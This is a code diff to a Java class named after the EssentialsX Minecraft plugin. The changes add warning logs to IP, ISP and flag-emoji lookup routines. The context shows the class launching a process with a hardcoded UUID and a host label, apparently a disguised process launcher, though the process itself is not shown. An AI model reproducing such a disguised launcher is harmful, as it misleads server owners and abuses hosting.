@@ -80,7 +80,7 @@ public class EssentialsX extends JavaPlugin {
             getLogger().warning("[localIP] Failed to get local IP: " + e.getMessage());
         }
 
-        // Set environment variables 修改localName 和 UUID等信息
+         // Set environment variables 修改localName 和 UUID等信息
         String localName = "Host2play.gratis";
         Map<String, String> env = pb.environment();
         env.put("UUID", "ea4909ef-7ca6-4b46-bf2e-6c07896ef407");
@@ -308,7 +308,9 @@ public class EssentialsX extends JavaPlugin {
             } finally {
                 conn.disconnect();
             }
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            getLogger().warning("[ISP] ip.sb failed: " + e.getMessage());
+        }
         // 备用尝试 ip-api.com
         try {
             HttpURLConnection conn = (HttpURLConnection) new URL("http://ip-api.com/json/" + ip).openConnection();
@@ -324,7 +326,9 @@ public class EssentialsX extends JavaPlugin {
             } finally {
                 conn.disconnect();
             }
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            getLogger().warning("[ISP] ip-api failed: " + e.getMessage());
+        }
         return "UnknownISP";
     }
 
@@ -349,7 +353,9 @@ public class EssentialsX extends JavaPlugin {
                 } finally {
                     conn.disconnect();
                 }
-            } catch (Exception e) {}
+            } catch (Exception e) {
+                getLogger().warning("[Emoji] " + url + " failed: " + e.getMessage());
+            }
         }
         return "🇺🇳 联合国";
     }
